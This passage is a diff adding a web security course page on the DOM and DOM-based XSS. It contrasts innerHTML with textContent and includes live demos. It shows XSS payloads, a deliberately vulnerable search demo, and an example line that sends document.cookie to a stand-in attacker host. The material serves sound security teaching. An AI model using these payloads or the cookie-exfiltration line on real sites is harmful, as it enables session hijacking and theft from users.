@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>2.1 — The DOM & JavaScript as a Weapon · Web Security</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#0d1117; --bg-card:#161b22; --bg-hover:#1c2333;
+      --border:#30363d; --border-soft:#21262d;
+      --text:#cdd9e5; --text-muted:#768390; --text-bright:#f0f6fc;
+      --blue:#58a6ff; --blue-dark:#1f6feb;
+      --green:#3fb950; --green-dark:#238636;
+      --red:#f78166; --yellow:#e3b341; --purple:#bc8cff; --cyan:#39d3f2;
+    }
+    html { scroll-behavior:smooth; }
+    body { font-family:'Segoe UI',system-ui,sans-serif; background:var(--bg); color:var(--text); line-height:1.75; font-size:16px; }
+    a { color:var(--blue); text-decoration:none; }
+    a:hover { text-decoration:underline; }
+    p { margin-bottom:1rem; }
+    strong { color:var(--text-bright); }
+    code { background:var(--border-soft); color:var(--yellow); padding:0.15rem 0.45rem; border-radius:4px; font-family:'Courier New',monospace; font-size:0.875rem; }
+
+    /* NAV */
+    nav { background:var(--bg-card); border-bottom:1px solid var(--border); padding:0 2rem; height:52px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:100; }
+    .nav-left { display:flex; align-items:center; gap:0.5rem; font-size:0.875rem; color:var(--text-muted); }
+    .nav-left a { color:var(--text-muted); }
+    .nav-left a:hover { color:var(--blue); text-decoration:none; }
+    .nav-sep { color:var(--border); }
+    .nav-current { color:var(--text-bright); font-weight:600; }
+    .nav-right { display:flex; gap:0.5rem; }
+    .nav-btn { background:var(--bg-hover); border:1px solid var(--border); color:var(--text-muted); padding:0.3rem 0.9rem; border-radius:6px; font-size:0.8rem; text-decoration:none; transition:background 0.15s; }
+    .nav-btn:hover { background:var(--border); color:var(--text-bright); text-decoration:none; }
+    .nav-btn.next { background:var(--green-dark); color:#fff; border-color:var(--green-dark); }
+    .nav-btn.next:hover { background:var(--green); }
+
+    /* HEADER */
+    .page-header { background:linear-gradient(160deg,#1a0e2e 0%,#0d1117 65%); border-bottom:1px solid var(--border); padding:2.5rem 2rem 2rem; max-width:900px; margin:0 auto; }
+    .module-tag { display:inline-block; background:#1e1228; border:1px solid #7c3aed55; color:var(--purple); font-size:0.72rem; font-weight:600; letter-spacing:0.08em; text-transform:uppercase; padding:0.25rem 0.75rem; border-radius:20px; margin-bottom:0.75rem; }
+    .page-header h1 { font-size:1.9rem; font-weight:900; color:var(--text-bright); margin-bottom:0.5rem; letter-spacing:-0.02em; }
+    .page-header p { color:var(--text-muted); font-size:1rem; max-width:620px; }
+    .header-meta { display:flex; gap:1rem; margin-top:1rem; flex-wrap:wrap; }
+    .header-meta span { font-size:0.8rem; color:var(--text-muted); background:var(--bg-card); border:1px solid var(--border-soft); padding:0.2rem 0.75rem; border-radius:20px; }
+
+    /* CONTENT */
+    .content { max-width:900px; margin:0 auto; padding:2rem 2rem 4rem; }
+
+    /* SECTION HEADING */
+    .section-heading { font-size:1.2rem; font-weight:800; color:var(--text-bright); margin:2.75rem 0 1rem; padding-bottom:0.4rem; border-bottom:1px solid var(--border-soft); display:flex; align-items:center; gap:0.5rem; letter-spacing:-0.01em; }
+
+    /* CALLOUTS */
+    .callout { border-radius:8px; padding:1rem 1.25rem; margin:1.5rem 0; border-left:4px solid; font-size:0.925rem; line-height:1.7; }
+    .callout-title { font-weight:700; font-size:0.78rem; text-transform:uppercase; letter-spacing:0.07em; margin-bottom:0.5rem; }
+    .callout.security { background:#1a0e0e; border-color:var(--red); }
+    .callout.security .callout-title { color:var(--red); }
+    .callout.tip  { background:#0e1a12; border-color:var(--green); }
+    .callout.tip .callout-title  { color:var(--green); }
+    .callout.info { background:#0d1b2e; border-color:var(--blue); }
+    .callout.info .callout-title { color:var(--blue); }
+    .callout.warning { background:#1a1500; border-color:var(--yellow); }
+    .callout.warning .callout-title { color:var(--yellow); }
+
+    /* TABLE */
+    table { width:100%; border-collapse:collapse; margin:1.25rem 0; font-size:0.9rem; }
+    thead tr { background:var(--border-soft); }
+    th { padding:0.65rem 1rem; color:var(--purple); text-align:left; font-size:0.78rem; text-transform:uppercase; letter-spacing:0.06em; border:1px solid var(--border); }
+    td { padding:0.65rem 1rem; border:1px solid var(--border); color:var(--text); vertical-align:top; }
+    tbody tr:nth-child(even) { background:#0a0e13; }
+    tbody tr:hover { background:var(--bg-hover); }
+
+    /* EDITOR — RESIZABLE */
+    .editor-wrap { background:var(--bg-card); border:1px solid var(--border); border-radius:10px; overflow:hidden; margin:1.5rem 0; }
+    .editor-toolbar { background:var(--border-soft); padding:0.6rem 1rem; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:0.5rem; }
+    .editor-toolbar-left { display:flex; align-items:center; gap:0.75rem; }
+    .editor-dots { display:flex; gap:5px; }
+    .editor-dots span { width:12px; height:12px; border-radius:50%; display:block; }
+    .dr{background:#f78166;} .dy{background:#e3b341;} .dg{background:#3fb950;}
+    .editor-title { font-size:0.8rem; color:var(--text-muted); font-family:'Courier New',monospace; }
+    .editor-btns  { display:flex; gap:0.5rem; align-items:center; }
+    .ed-btn { font-size:0.8rem; font-weight:600; padding:0.3rem 0.9rem; border-radius:6px; cursor:pointer; border:1px solid var(--border); transition:background 0.15s; }
+    .ed-btn-run   { background:var(--green-dark); color:#fff; border-color:var(--green-dark); }
+    .ed-btn-run:hover { background:var(--green); }
+    .ed-btn-reset { background:var(--bg-hover); color:var(--text-muted); }
+    .ed-btn-reset:hover { background:var(--border); color:var(--text-bright); }
+    .editor-label { background:var(--border-soft); padding:0.3rem 1rem; font-size:0.72rem; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.06em; display:flex; justify-content:space-between; align-items:center; }
+    .resize-control { display:flex; align-items:center; gap:0.5rem; font-size:0.72rem; color:var(--text-muted); }
+    .resize-control input[type=range] { width:80px; accent-color:var(--purple); cursor:pointer; }
+
+    /* SPLIT PANE */
+    .editor-panes { display:grid; grid-template-columns:1fr 1fr; }
+    .editor-code { width:100%; background:#0d1117; color:var(--text); border:none; outline:none; padding:1rem 1.25rem; font-family:'Courier New',monospace; font-size:0.875rem; line-height:1.65; resize:none; border-right:1px solid var(--border); tab-size:2; display:block; }
+    .editor-preview { background:#fff; border:none; width:100%; }
+    @media(max-width:640px){ .editor-panes{grid-template-columns:1fr;} .editor-code{border-right:none;border-bottom:1px solid var(--border);} }
+
+    /* FULL-WIDTH EDITOR (no preview) */
+    .editor-solo { width:100%; background:#0d1117; color:var(--text); border:none; outline:none; padding:1rem 1.25rem; font-family:'Courier New',monospace; font-size:0.875rem; line-height:1.65; resize:none; tab-size:2; display:block; }
+
+    /* DOM VISUALISER */
+    .dom-vis { background:var(--bg-card); border:1px solid var(--border); border-radius:10px; overflow:hidden; margin:1.5rem 0; }
+    .dom-vis-header { background:var(--border-soft); padding:0.65rem 1.25rem; font-size:0.8rem; color:var(--text-muted); display:flex; justify-content:space-between; align-items:center; }
+    .dom-vis-body { display:grid; grid-template-columns:1fr 1fr; }
+    @media(max-width:600px){ .dom-vis-body{grid-template-columns:1fr;} }
+    .dom-tree-pane { padding:1.25rem 1.5rem; border-right:1px solid var(--border); font-family:'Courier New',monospace; font-size:0.83rem; }
+    .dom-node { padding:0.25rem 0; display:flex; align-items:flex-start; gap:0.4rem; cursor:pointer; border-radius:4px; padding-left:0.3rem; transition:background 0.12s; }
+    .dom-node:hover { background:var(--bg-hover); }
+    .dom-node.selected { background:#1f2d3d; }
+    .dn-connector { color:var(--text-muted); user-select:none; }
+    .dn-tag  { color:var(--blue); font-weight:700; }
+    .dn-attr { color:var(--yellow); }
+    .dn-text { color:var(--green); font-style:italic; }
+    .dn-i1{margin-left:1.2rem;} .dn-i2{margin-left:2.4rem;} .dn-i3{margin-left:3.6rem;}
+    .dom-info-pane { padding:1.25rem 1.5rem; background:var(--bg); }
+    .dom-info-pane h4 { font-size:0.9rem; font-weight:700; color:var(--text-bright); margin-bottom:0.5rem; }
+    .dom-info-pane p  { font-size:0.85rem; color:var(--text-muted); margin-bottom:0.75rem; }
+    .dom-info-pane pre { background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:0.65rem 1rem; font-size:0.8rem; color:var(--text); overflow-x:auto; }
+    .danger-tag { color:var(--red); }
+
+    /* INNERHTML vs TEXTCONTENT DEMO */
+    .compare-demo { display:grid; grid-template-columns:1fr 1fr; gap:1.25rem; margin:1.5rem 0; }
+    @media(max-width:600px){ .compare-demo{grid-template-columns:1fr;} }
+    .compare-panel { background:var(--bg-card); border:1px solid var(--border); border-radius:10px; overflow:hidden; }
+    .compare-panel-header { padding:0.65rem 1rem; font-size:0.82rem; font-weight:700; display:flex; align-items:center; gap:0.5rem; }
+    .cph-danger { background:#1a0e0e; color:var(--red); border-bottom:1px solid #b91c1c44; }
+    .cph-safe   { background:#0e1a12; color:var(--green); border-bottom:1px solid #23863644; }
+    .compare-panel-body { padding:1rem; }
+    .compare-input { width:100%; background:var(--bg); border:1px solid var(--border); color:var(--text); padding:0.5rem 0.75rem; border-radius:6px; font-size:0.875rem; margin-bottom:0.75rem; outline:none; font-family:'Courier New',monospace; }
+    .compare-input:focus { border-color:var(--blue); }
+    .compare-run { font-size:0.8rem; font-weight:600; padding:0.3rem 0.9rem; border-radius:6px; cursor:pointer; border:none; margin-bottom:0.75rem; transition:background 0.15s; }
+    .cr-danger { background:#b91c1c; color:#fff; }
+    .cr-danger:hover { background:var(--red); }
+    .cr-safe   { background:var(--green-dark); color:#fff; }
+    .cr-safe:hover { background:var(--green); }
+    .compare-result-label { font-size:0.72rem; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.06em; margin-bottom:0.3rem; }
+    .compare-result { background:var(--bg); border:1px solid var(--border); border-radius:6px; min-height:44px; padding:0.5rem 0.75rem; font-size:0.875rem; }
+    .compare-code-label { font-size:0.72rem; color:var(--text-muted); margin-top:0.75rem; margin-bottom:0.3rem; text-transform:uppercase; letter-spacing:0.06em; }
+    .compare-code { background:#0d1117; border:1px solid var(--border); border-radius:6px; padding:0.65rem 0.9rem; font-family:'Courier New',monospace; font-size:0.78rem; color:var(--text); }
+
+    /* ATTACK CHAIN */
+    .attack-chain { margin:1.5rem 0; display:flex; flex-direction:column; gap:0; }
+    .ac-step { display:flex; gap:1.25rem; }
+    .ac-left  { display:flex; flex-direction:column; align-items:center; flex-shrink:0; }
+    .ac-num   { width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.8rem; font-weight:800; flex-shrink:0; }
+    .ac-line  { flex:1; width:2px; background:var(--border-soft); margin:3px 0; min-height:24px; }
+    .ac-body  { padding-bottom:1.25rem; flex:1; }
+    .ac-body h4 { font-size:0.925rem; font-weight:700; color:var(--text-bright); margin-bottom:0.3rem; }
+    .ac-body p  { font-size:0.875rem; color:var(--text-muted); margin:0; }
+    .ac-body code { font-size:0.8rem; }
+    .an-blue   { background:#1f2d3d; color:var(--blue); border:2px solid var(--blue); }
+    .an-yellow { background:#1a1500; color:var(--yellow); border:2px solid var(--yellow); }
+    .an-red    { background:#1a0e0e; color:var(--red); border:2px solid var(--red); }
+    .an-green  { background:#0e1a12; color:var(--green); border:2px solid var(--green); }
+
+    /* XSS SINK EXPLORER */
+    .sink-explorer { background:var(--bg-card); border:1px solid var(--border); border-radius:10px; overflow:hidden; margin:1.5rem 0; }
+    .sink-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:0.5rem; padding:1rem 1.25rem; }
+    .sink-chip { padding:0.6rem 0.9rem; border-radius:6px; cursor:pointer; font-family:'Courier New',monospace; font-size:0.82rem; border:1px solid; transition:all 0.15s; }
+    .sink-chip:hover { filter:brightness(1.2); }
+    .sink-chip.active { box-shadow:0 0 0 2px var(--blue); }
+    .sc-danger { background:#1a0e0e; color:var(--red); border-color:#b91c1c44; }
+    .sc-warn   { background:#1a1500; color:var(--yellow); border-color:#b0880044; }
+    .sc-safe   { background:#0e1a12; color:var(--green); border-color:#23863644; }
+    .sink-detail { border-top:1px solid var(--border); padding:1.25rem 1.5rem; display:none; }
+    .sink-detail.show { display:block; }
+    .sink-detail h4 { font-size:0.95rem; font-weight:700; color:var(--text-bright); margin-bottom:0.5rem; }
+    .sink-detail p  { font-size:0.875rem; color:var(--text-muted); margin-bottom:0.75rem; }
+    .sink-detail pre { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:0.75rem 1rem; font-size:0.8rem; color:var(--text); overflow-x:auto; }
+    .risk-badge { display:inline-block; font-size:0.7rem; font-weight:700; padding:0.15rem 0.55rem; border-radius:20px; margin-left:0.4rem; }
+    .rb-high { background:#b91c1c33; color:var(--red); border:1px solid #b91c1c55; }
+    .rb-med  { background:#b0880033; color:var(--yellow); border:1px solid #b0880055; }
+    .rb-low  { background:#1a7f3733; color:var(--green); border:1px solid #1a7f3755; }
+
+    /* BOTTOM NAV */
+    .bottom-nav { display:flex; justify-content:space-between; align-items:center; margin-top:3rem; padding-top:2rem; border-top:1px solid var(--border-soft); gap:1rem; flex-wrap:wrap; }
+    .bottom-nav a { display:inline-flex; align-items:center; gap:0.5rem; padding:0.65rem 1.5rem; border-radius:8px; font-size:0.9rem; font-weight:600; text-decoration:none; transition:background 0.15s; }
+    .btn-back { background:var(--bg-card); border:1px solid var(--border); color:var(--text-muted); }
+    .btn-back:hover { background:var(--bg-hover); color:var(--text-bright); }
+    .btn-next { background:var(--green-dark); border:1px solid var(--green-dark); color:#fff; }
+    .btn-next:hover { background:var(--green); }
+  </style>
+</head>
+<body>
+
+  <!-- NAV -->
+  <nav>
+    <div class="nav-left">
+      <a href="../index.html">🛡️ Web Security</a>
+      <span class="nav-sep">›</span>
+      <a href="#">Module 2</a>
+      <span class="nav-sep">›</span>
+      <span class="nav-current">2.1 — The DOM &amp; JavaScript as a Weapon</span>
+    </div>
+    <div class="nav-right">
+      <a class="nav-btn" href="../modul-1/1-4-lab.html">← 1.4 Mini-Lab</a>
+      <a class="nav-btn next" href="2-2.html">Next: Cookies &amp; Sessions →</a>
+    </div>
+  </nav>
+
+  <!-- HEADER -->
+  <div class="page-header">
+    <div class="module-tag">Module 2 · Sub-module 2.1</div>
+    <h1>🧠 The DOM &amp; JavaScript as a Weapon</h1>
+    <p>The browser does not just display HTML — it builds a live, programmable tree from it. JavaScript can read, rewrite, and weaponise every node in that tree. Understanding this is the key to understanding every XSS attack.</p>
+    <div class="header-meta">
+      <span>⏱️ ~20 minutes</span>
+      <span>📖 Reading + Interactive</span>
+      <span>⚡ Live demos</span>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- ══ 1. WHAT THE DOM IS ══ -->
+    <div class="section-heading">🌳 The DOM: The Browser's Live Model of Your Page</div>
+
+    <p>
+      When a browser receives an HTML file, it does not just paint it to the screen and forget it.
+      It parses the entire document and builds it into a <strong>tree of objects in memory</strong>
+      called the <strong>Document Object Model (DOM)</strong>. Every tag becomes a node.
+      Every attribute becomes a property. Every piece of text becomes a text node.
+    </p>
+    <p>
+      This tree is <strong>live</strong> — JavaScript can read it, modify it, add to it,
+      and delete from it at any time. That is how modern websites work:
+      buttons update content without reloading the page, forms validate in real time,
+      menus appear and disappear. The DOM is the API between HTML and JavaScript.
+    </p>
+    <p>
+      It is also, from a security perspective, <strong>the battlefield</strong>.
+      Every XSS attack is ultimately an attack on the DOM — injecting instructions
+      that the browser's JavaScript engine will execute with the full trust and permissions
+      of the page.
+    </p>
+
+    <!-- Interactive DOM tree -->
+    <div class="dom-vis">
+      <div class="dom-vis-header">
+        <span>🖱️ Click any node to see what JavaScript can do with it</span>
+        <span style="color:var(--red);font-size:0.78rem;">Red = XSS-relevant</span>
+      </div>
+      <div class="dom-vis-body">
+        <div class="dom-tree-pane" id="domTreePane">
+          <div class="dom-node" onclick="showDomInfo('window')"><span class="dn-connector">🌐</span><span class="dn-tag">window</span></div>
+          <div class="dom-node dn-i1" onclick="showDomInfo('document')"><span class="dn-connector">└─</span><span class="dn-tag">document</span></div>
+          <div class="dom-node dn-i2" onclick="showDomInfo('html')"><span class="dn-connector">└─</span><span class="dn-tag">&lt;html&gt;</span></div>
+          <div class="dom-node dn-i3" onclick="showDomInfo('head')"><span class="dn-connector">├─</span><span class="dn-tag">&lt;head&gt;</span></div>
+          <div class="dom-node dn-i3" onclick="showDomInfo('body')"><span class="dn-connector">└─</span><span class="dn-tag">&lt;body&gt;</span></div>
+          <div class="dom-node" style="margin-left:4.8rem" onclick="showDomInfo('div')"><span class="dn-connector">├─</span><span class="dn-tag">&lt;div</span> <span class="dn-attr">id="output"</span><span class="dn-tag">&gt;</span></div>
+          <div class="dom-node" style="margin-left:4.8rem" onclick="showDomInfo('input')"><span class="dn-connector">├─</span><span class="dn-tag danger-tag">&lt;input</span> <span class="dn-attr">id="search"</span><span class="dn-tag danger-tag">&gt;</span> <span style="color:var(--red);font-size:0.78rem;">← source</span></div>
+          <div class="dom-node" style="margin-left:4.8rem" onclick="showDomInfo('script')"><span class="dn-connector">└─</span><span class="dn-tag danger-tag">&lt;script&gt;</span> <span style="color:var(--red);font-size:0.78rem;">← sink</span></div>
+        </div>
+        <div class="dom-info-pane" id="domInfoPane">
+          <h4 style="color:var(--text-muted);font-weight:400;font-size:0.875rem;">← Click a node to explore</h4>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <div class="callout-title">ℹ️ Source vs Sink — the two halves of DOM XSS</div>
+      In DOM-based XSS, the attack always has two parts:
+      a <strong>source</strong> (where attacker-controlled data enters the JavaScript environment — e.g. <code>location.hash</code>, <code>document.cookie</code>, a form input value)
+      and a <strong>sink</strong> (where that data is written into the DOM — e.g. <code>innerHTML</code>, <code>document.write()</code>).
+      The vulnerability exists when data flows from a source to a dangerous sink without sanitization.
+    </div>
+
+
+    <!-- ══ 2. INNERHTML vs TEXTCONTENT ══ -->
+    <div class="section-heading">⚔️ innerHTML vs textContent — The Most Important Line in Web Security</div>
+
+    <p>
+      There is one decision that developers make thousands of times — and one of its two options
+      creates XSS vulnerabilities. The choice is between <code>innerHTML</code> and <code>textContent</code>.
+      They look nearly identical in code. The difference in behaviour is enormous.
+    </p>
+
+    <table>
+      <thead><tr><th>Property</th><th>Interprets HTML tags?</th><th>Can execute JavaScript?</th><th>Verdict</th></tr></thead>
+      <tbody>
+        <tr><td><code>element.innerHTML = value</code></td><td>✅ Yes — parses as HTML</td><td>✅ Yes — via event handlers, script tags</td><td style="color:var(--red);font-weight:700;">⚠️ Dangerous</td></tr>
+        <tr><td><code>element.textContent = value</code></td><td>❌ No — treats as plain text</td><td>❌ Never</td><td style="color:var(--green);font-weight:700;">✅ Safe</td></tr>
+        <tr><td><code>element.innerText = value</code></td><td>❌ No</td><td>❌ Never</td><td style="color:var(--green);font-weight:700;">✅ Safe</td></tr>
+        <tr><td><code>document.write(value)</code></td><td>✅ Yes</td><td>✅ Yes</td><td style="color:var(--red);font-weight:700;">⚠️ Dangerous — avoid entirely</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Side-by-side live demo -->
+    <div class="compare-demo">
+      <div class="compare-panel">
+        <div class="compare-panel-header cph-danger">
+          ❌ Dangerous — <code>innerHTML</code>
+        </div>
+        <div class="compare-panel-body">
+          <div style="font-size:0.78rem;color:var(--text-muted);margin-bottom:0.4rem;">Type anything — including HTML tags:</div>
+          <input class="compare-input" id="dangerInput" type="text" value="&lt;img src=x onerror=alert('XSS!')&gt;" placeholder="Try: &lt;b&gt;bold&lt;/b&gt;">
+          <button class="compare-run cr-danger" onclick="runDanger()">▶ Run with innerHTML</button>
+          <div class="compare-result-label">Result — browser renders:</div>
+          <div class="compare-result" id="dangerResult" style="background:#fff;color:#111;font-family:sans-serif;"></div>
+          <div class="compare-code-label">The code doing this:</div>
+          <div class="compare-code">div.innerHTML = userInput;</div>
+        </div>
+      </div>
+
+      <div class="compare-panel">
+        <div class="compare-panel-header cph-safe">
+          ✅ Safe — <code>textContent</code>
+        </div>
+        <div class="compare-panel-body">
+          <div style="font-size:0.78rem;color:var(--text-muted);margin-bottom:0.4rem;">Same input — watch what happens:</div>
+          <input class="compare-input" id="safeInput" type="text" value="&lt;img src=x onerror=alert('XSS!')&gt;" placeholder="Try: &lt;b&gt;bold&lt;/b&gt;">
+          <button class="compare-run cr-safe" onclick="runSafe()">▶ Run with textContent</button>
+          <div class="compare-result-label">Result — browser renders:</div>
+          <div class="compare-result" id="safeResult" style="font-family:'Courier New',monospace;font-size:0.875rem;color:var(--text);background:var(--bg);"></div>
+          <div class="compare-code-label">The code doing this:</div>
+          <div class="compare-code">div.textContent = userInput;</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout security">
+      <div class="callout-title">🔐 The Rule: Never pass user input to innerHTML</div>
+      If you must insert HTML dynamically, sanitize it first with a library like
+      <strong>DOMPurify</strong>: <code>div.innerHTML = DOMPurify.sanitize(userInput)</code>.
+      But in the vast majority of cases, <code>textContent</code> is what you actually need —
+      and it is always safe. Choosing <code>innerHTML</code> without sanitization is one of
+      the most common mistakes in modern JavaScript development.
+    </div>
+
+
+    <!-- ══ 3. DOM-BASED XSS ══ -->
+    <div class="section-heading">💥 DOM-Based XSS — The Attack That Never Touches the Server</div>
+
+    <p>
+      In Module 1 you saw <strong>Reflected XSS</strong> (payload in the URL, reflected back by the server)
+      and <strong>Stored XSS</strong> (payload saved and served to all users).
+      <strong>DOM-based XSS</strong> is different — the server is completely uninvolved.
+      The JavaScript running in the page takes attacker-controlled data and writes it
+      directly into the DOM using a dangerous sink.
+    </p>
+    <p>
+      This means <strong>server-side sanitization cannot stop it</strong> — because the
+      server never sees the payload. The server sends a perfectly clean HTML page.
+      The vulnerability lives entirely in the client-side JavaScript.
+    </p>
+
+    <!-- Attack chain visual -->
+    <div class="attack-chain">
+      <div class="ac-step">
+        <div class="ac-left"><div class="ac-num an-blue">1</div><div class="ac-line"></div></div>
+        <div class="ac-body">
+          <h4>Attacker crafts a URL with payload in the fragment</h4>
+          <p><code>https://shop.com/search#&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>
+          The <code>#fragment</code> is <strong>never sent to the server</strong> — the browser keeps it locally.</p>
+        </div>
+      </div>
+      <div class="ac-step">
+        <div class="ac-left"><div class="ac-num an-blue">2</div><div class="ac-line"></div></div>
+        <div class="ac-body">
+          <h4>Victim clicks the link — browser loads the page normally</h4>
+          <p>Server receives <code>GET /search</code> — no payload visible. Server returns clean HTML. No server-side filter triggers.</p>
+        </div>
+      </div>
+      <div class="ac-step">
+        <div class="ac-left"><div class="ac-num an-yellow">3</div><div class="ac-line"></div></div>
+        <div class="ac-body">
+          <h4>Client-side JavaScript reads the fragment — the source</h4>
+          <p><code>const query = location.hash.slice(1); // reads the payload</code></p>
+        </div>
+      </div>
+      <div class="ac-step">
+        <div class="ac-left"><div class="ac-num an-red">4</div><div class="ac-line"></div></div>
+        <div class="ac-body">
+          <h4>JavaScript writes it to the DOM using innerHTML — the sink</h4>
+          <p><code>document.getElementById('results').innerHTML = query;</code><br>
+          The browser parses the injected HTML. The <code>onerror</code> handler fires. Cookie stolen.</p>
+        </div>
+      </div>
+      <div class="ac-step">
+        <div class="ac-left"><div class="ac-num an-green">5</div></div>
+        <div class="ac-body">
+          <h4>The fix — one word</h4>
+          <p><code>document.getElementById('results').<strong>textContent</strong> = query;</code><br>
+          The payload is rendered as harmless text. No parsing. No execution. Zero XSS.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Live DOM XSS demo -->
+    <div class="editor-wrap">
+      <div class="editor-toolbar">
+        <div class="editor-toolbar-left">
+          <div class="editor-dots"><span class="dr"></span><span class="dy"></span><span class="dg"></span></div>
+          <span class="editor-title">dom-xss-demo.html — edit and run</span>
+        </div>
+        <div class="editor-btns">
+          <button class="ed-btn ed-btn-reset" onclick="resetEd('domXssEd','domXssPrev')">Reset</button>
+          <button class="ed-btn ed-btn-run"   onclick="runEd('domXssEd','domXssPrev')">▶ Run</button>
+        </div>
+      </div>
+      <div class="editor-label">
+        <span>✏️ The URL hash feeds directly into innerHTML — try changing innerHTML to textContent on line 14</span>
+        <div class="resize-control">
+          🔲 Height: <input type="range" min="160" max="520" value="260" oninput="resizeEd('domXssEd','domXssPrev',this.value)">
+        </div>
+      </div>
+      <div class="editor-panes">
+        <textarea class="editor-code" id="domXssEd" style="min-height:260px" spellcheck="false"><!DOCTYPE html>
+<html>
+<body style="font-family:sans-serif; padding:1.5rem; background:#f9f9f9">
+
+  <h2>🔍 Product Search</h2>
+  <p id="results" style="margin-top:1rem; font-size:1rem; color:#333">
+    Results will appear here...
+  </p>
+
+  <script>
+    // Reads the URL fragment: everything after #
+    const query = location.hash.slice(1);
+    if (query) {
+      // ❌ VULNERABLE — change innerHTML to textContent to fix
+      document.getElementById('results').innerHTML =
+        'Results for: ' + decodeURIComponent(query);
+    }
+  </script>
+
+</body>
+</html></textarea>
+        <iframe class="editor-preview" id="domXssPrev" style="min-height:260px"
+          sandbox="allow-scripts allow-modals"></iframe>
+      </div>
+    </div>
+
+    <div class="callout tip">
+      <div class="callout-title">💡 How to test this</div>
+      After clicking Run, look at the preview — it shows "Results will appear here" because there is no hash in the URL.
+      The real attack happens when a victim opens a crafted URL like
+      <code>page.html#&lt;img src=x onerror=alert(1)&gt;</code>.
+      Change <code>innerHTML</code> to <code>textContent</code> on line 14 and re-run — the same payload now renders as harmless text.
+    </div>
+
+
+    <!-- ══ 4. DANGEROUS SINKS ══ -->
+    <div class="section-heading">🕳️ Every Dangerous Sink You Need to Know</div>
+
+    <p>
+      During a code review or a penetration test, these are the JavaScript properties and functions
+      you search for. Any one of them, receiving unsanitized user input, is a potential XSS vulnerability.
+      Click each to see why it is dangerous and how to spot it.
+    </p>
+
+    <div class="sink-explorer">
+      <div style="padding:0.75rem 1.25rem; border-bottom:1px solid var(--border); font-size:0.8rem; color:var(--text-muted);">
+        🔴 High risk &nbsp;·&nbsp; 🟡 Medium risk &nbsp;·&nbsp; 🟢 Safe alternative
+      </div>
+      <div class="sink-grid">
+        <div class="sink-chip sc-danger" onclick="showSink(this,'innerHTML')">element.innerHTML</div>
+        <div class="sink-chip sc-danger" onclick="showSink(this,'docwrite')">document.write()</div>
+        <div class="sink-chip sc-danger" onclick="showSink(this,'outerHTML')">element.outerHTML</div>
+        <div class="sink-chip sc-danger" onclick="showSink(this,'insertAdj')">insertAdjacentHTML()</div>
+        <div class="sink-chip sc-danger" onclick="showSink(this,'eval')">eval()</div>
+        <div class="sink-chip sc-danger" onclick="showSink(this,'settimeout')">setTimeout(string)</div>
+        <div class="sink-chip sc-warn"   onclick="showSink(this,'href')">element.href</div>
+        <div class="sink-chip sc-warn"   onclick="showSink(this,'srcsink')">iframe.src / script.src</div>
+        <div class="sink-chip sc-safe"   onclick="showSink(this,'textContent')">textContent ✅</div>
+        <div class="sink-chip sc-safe"   onclick="showSink(this,'innerText')">innerText ✅</div>
+      </div>
+      <div class="sink-detail" id="sinkDetail"></div>
+    </div>
+
+
+    <!-- ══ 5. REAL-WORLD METHODS ══ -->
+    <div class="section-heading">🔎 How Attackers Find DOM XSS in the Wild</div>
+
+    <p>When a professional penetration tester audits a JavaScript-heavy application for DOM XSS, the process is methodical:</p>
+
+    <table>
+      <thead><tr><th>Step</th><th>What they do</th><th>What they look for</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>1 — Map sources</strong></td>
+          <td>Search the JS codebase for places where attacker data enters</td>
+          <td><code>location.hash</code>, <code>location.search</code>, <code>location.href</code>, <code>document.referrer</code>, <code>document.URL</code>, <code>window.name</code>, <code>postMessage</code></td>
+        </tr>
+        <tr>
+          <td><strong>2 — Map sinks</strong></td>
+          <td>Search for dangerous functions receiving that data</td>
+          <td><code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout</code>, <code>insertAdjacentHTML</code></td>
+        </tr>
+        <tr>
+          <td><strong>3 — Trace the flow</strong></td>
+          <td>Check whether data travels from source to sink without sanitization</td>
+          <td>Any assignment or string concatenation between source and sink</td>
+        </tr>
+        <tr>
+          <td><strong>4 — Craft a payload</strong></td>
+          <td>Build a URL or input that places a JavaScript payload at the source</td>
+          <td><code>#&lt;img src=x onerror=alert(1)&gt;</code> is the standard first test</td>
+        </tr>
+        <tr>
+          <td><strong>5 — Escalate</strong></td>
+          <td>Replace <code>alert(1)</code> with <code>fetch('https://attacker.com?c='+document.cookie)</code></td>
+          <td>Demonstrate actual cookie theft or session hijacking impact</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- Final live editor — sandbox -->
+    <div class="editor-wrap">
+      <div class="editor-toolbar">
+        <div class="editor-toolbar-left">
+          <div class="editor-dots"><span class="dr"></span><span class="dy"></span><span class="dg"></span></div>
+          <span class="editor-title">sandbox.html — free practice</span>
+        </div>
+        <div class="editor-btns">
+          <button class="ed-btn ed-btn-reset" onclick="resetEd('sandboxEd','sandboxPrev')">Reset</button>
+          <button class="ed-btn ed-btn-run"   onclick="runEd('sandboxEd','sandboxPrev')">▶ Run</button>
+        </div>
+      </div>
+      <div class="editor-label">
+        <span>✏️ Free sandbox — experiment with innerHTML, textContent, eval, and document.write</span>
+        <div class="resize-control">
+          🔲 Height: <input type="range" min="160" max="600" value="300" oninput="resizeEd('sandboxEd','sandboxPrev',this.value)">
+        </div>
+      </div>
+      <div class="editor-panes">
+        <textarea class="editor-code" id="sandboxEd" style="min-height:300px" spellcheck="false"><!DOCTYPE html>
+<html>
+<body style="font-family:sans-serif; padding:1.5rem; background:#f9f9f9">
+
+  <h2>🧪 DOM Sandbox</h2>
+
